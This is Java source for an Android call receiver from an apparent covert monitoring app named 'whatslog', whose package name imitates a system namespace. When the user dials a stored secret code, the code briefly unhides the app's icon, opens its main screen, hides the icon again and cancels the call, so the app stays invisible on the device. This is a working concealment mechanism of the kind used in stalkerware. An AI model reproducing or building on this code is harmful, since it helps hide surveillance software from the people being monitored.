package com.android.whatslog.receiver;

import java.sql.SQLException;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.android.whatslog.Utils;
import com.android.whatslog.activities.MainActivity;
import com.android.whatslog.dao.DatabaseHelperConfiguracao;
import com.android.whatslog.model.Configuracao;

public class LaunchReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {

		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
				context);
		List<Configuracao> confs;
		try {
			confs = database.getDao().queryForAll();

			Configuracao conf = null;

			if (confs.size() > 0) {
				conf = confs.get(0);
			}
			if (conf != null) {
				String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
				String compare_num = conf.getDialer();
				if (number.equals(compare_num)) {
					Utils.showIcon(true, context);

					Intent myintent = new Intent(context, MainActivity.class);
					myintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(myintent);

					Utils.showIcon(false, context);

					setResultData(null);
					abortBroadcast();
				}
			}
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}